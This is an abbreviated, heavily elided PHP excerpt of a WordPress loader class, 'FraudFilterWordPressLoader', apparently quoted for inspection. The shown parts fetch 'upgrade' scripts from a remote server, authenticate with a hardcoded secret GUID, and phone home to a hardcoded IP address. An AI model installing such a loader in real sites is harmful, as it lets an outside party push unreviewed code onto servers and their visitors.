...
class FraudFilterWordPressLoader_9li28 {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = '551b1a35-bd02-46d1-ab37-6f91b816dc96.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 551b1a35-bd02-46d1-ab37-6f91b816dc96',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: 551b1a35-bd02-46d1-ab37-6f91b816dc96';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 551b1a35-bd02-46d1-ab37-6f91b816dc96';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=9li28&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_9li28 = new FraudFilterWordPressLoader_9li28();
$fraudFilterWordPressLoader_9li28->run();
